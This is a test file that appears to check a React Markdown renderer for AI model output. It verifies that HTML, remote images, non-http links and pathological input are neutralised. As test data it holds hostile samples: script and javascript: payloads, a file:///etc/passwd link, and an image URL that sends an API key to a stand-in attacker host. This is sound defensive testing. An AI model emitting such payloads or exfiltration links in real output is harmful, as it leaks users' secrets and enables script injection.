/** Security 5: model output (and skill bodies, which use the same component)
 * renders as React nodes only. Raw HTML is text, remote images never load,
 * and links are http(s) only, open without an opener and show their URL. */
import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { MARKDOWN_LIMIT, Markdown } from './markdown';

describe('Markdown rendering limits', () => {
  it('raw HTML stays text, with no element created from it', () => {
    const { container } = render(<Markdown text={'<script>alert(1)</script> <iframe src="https://x"></iframe> <b>bold</b>'} />);
    expect(container.querySelector('script, iframe, b')).toBeNull();
    expect(container.textContent).toContain('<script>alert(1)</script>');
  });

  it('a remote image is link text, never an <img> (no request leaves the page)', () => {
    const { container } = render(<Markdown text={'See ![chart](https://attacker.example/x.png?data=API_KEY) here.'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: '[image: chart]' });
    expect(link).toHaveAttribute('href', 'https://attacker.example/x.png?data=API_KEY');
    expect(link).toHaveAttribute('title', 'https://attacker.example/x.png?data=API_KEY');
    expect(container.textContent).not.toContain('!');
  });

  it('an image with a non-http URL stays raw text', () => {
    const { container } = render(<Markdown text={'![x](data:image/png;base64,AAAA) ![y](javascript:alert(1))'} />);
    expect(container.querySelector('img, a')).toBeNull();
    expect(container.textContent).toContain('![x](data:image/png;base64,AAAA)');
  });

  it('links: http(s) only, new tab without opener, full URL in the title', () => {
    const { container } = render(<Markdown text={'[safe](https://example.com/a?b=c) [bad](javascript:alert(1)) [file](file:///etc/passwd)'} />);
    const links = container.querySelectorAll('a');
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute('href', 'https://example.com/a?b=c');
    expect(links[0]).toHaveAttribute('target', '_blank');
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
    expect(links[0]).toHaveAttribute('title', 'https://example.com/a?b=c');
    expect(container.textContent).toContain('[bad](javascript:alert(1))');
  });
});

describe('SEC2: hostile text renders in linear time', () => {
  const time = (text: string) => {
    const start = performance.now();
    renderToStaticMarkup(<Markdown text={text} />);
    return performance.now() - start;
  };
  // Warm the JIT once so the first measured case is not charged for it.
  renderToStaticMarkup(<Markdown text={'`x` **b** *i* [l](https://e.com) ![a](https://e.com/i.png)'} />);

  it('`x`![a]( repeated 4000 times (cubic before) renders within 200 ms', () => {
    expect(time('`x`![a]('.repeat(4000))).toBeLessThan(200);
  });

  it.each([
    ['italic', ' *a'], ['bold', '**a'], ['link', '[a]('], ['image', '![a]('], ['code and italic', '`x` *a '], ['code and bold', '`x` **a '],
  ])('%s openers without closers, 8000 times, within 200 ms', (_name, unit) => {
    expect(time(unit.repeat(8000))).toBeLessThan(200);
  });

  it('a 30 KB ordinary document with every construct renders within 200 ms', () => {
    const block = '## Section\n\nSome **bold** and *italic* text with `code`, a [link](https://example.com/a) and ![img](https://example.com/i.png).\n\n- item one\n- item two\n\n```\ncode block\n```\n\n';
    const text = block.repeat(Math.floor(30_000 / block.length));
    expect(text.length).toBeLessThanOrEqual(MARKDOWN_LIMIT);
    expect(time(text)).toBeLessThan(200);
  });

  it('a 64 KB document is shown as plain text, without markdown, within 200 ms', () => {
    const text = 'plain **not bold** [not](https://a.b) '.repeat(Math.ceil(65_536 / 38));
    expect(time(text)).toBeLessThan(200);
    const html = renderToStaticMarkup(<Markdown text={text} />);
    expect(html.startsWith('<pre class="gcp-md-plain">')).toBe(true);
    expect(html).not.toContain('<strong>');
    expect(html).not.toContain('<a ');
  });
});
